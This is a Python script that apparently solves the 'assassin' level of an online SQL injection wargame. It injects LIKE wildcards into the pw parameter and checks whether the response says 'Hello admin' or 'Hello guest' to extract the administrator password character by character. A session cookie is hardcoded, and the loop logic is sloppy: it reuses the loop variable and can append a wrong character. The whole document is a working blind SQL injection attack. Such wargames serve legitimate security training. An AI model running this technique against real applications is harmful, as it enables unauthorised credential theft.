import requests
import string

session = requests.Session()

url = 'https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php?pw={}%'
cookies = {"PHPSESSID": "tqlf4m3teeel2nlo0lv61671fc"}
pw = ""
for j in range(8):
    for i in string.printable:
        r = requests.get(url.format(pw+i), cookies=cookies)
        if('Hello admin' in r.text[:200] and i not in "_#*%"):
            print('a',i)
            j= i
            break
        if('Hello guest' in r.text[:200] and i not in "_#*%"):
            print('g',i)
            j= i
    pw+=j
    print("Password :", pw)
print("Password :", pw)
